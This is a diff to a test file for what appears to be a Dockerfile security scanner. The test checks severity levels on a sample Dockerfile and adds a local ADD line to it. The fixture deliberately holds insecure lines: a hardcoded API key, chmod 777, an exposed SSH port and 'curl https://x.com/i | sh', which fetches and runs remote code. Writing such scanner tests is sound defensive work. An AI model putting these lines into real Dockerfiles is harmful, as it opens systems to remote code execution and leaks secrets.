@@ -239,7 +239,7 @@ class TestDockerSeverities:
     def test_severity_levels(self, tmp_dockerfile):
         content = (
             "FROM ubuntu\nENV API_KEY=sk-verylongsecretvalue123\nADD https://x.com/i /tmp/i\n"
-            "COPY --chmod=777 app /app\nRUN curl https://x.com/i | sh\nEXPOSE 22\n"
+            "ADD local.tar.gz /opt/\nCOPY --chmod=777 app /app\nRUN curl https://x.com/i | sh\nEXPOSE 22\n"
         )
         findings = scan_dockerfile(tmp_dockerfile(content))
         by_id = {f.rule_id: f.severity for f in findings}
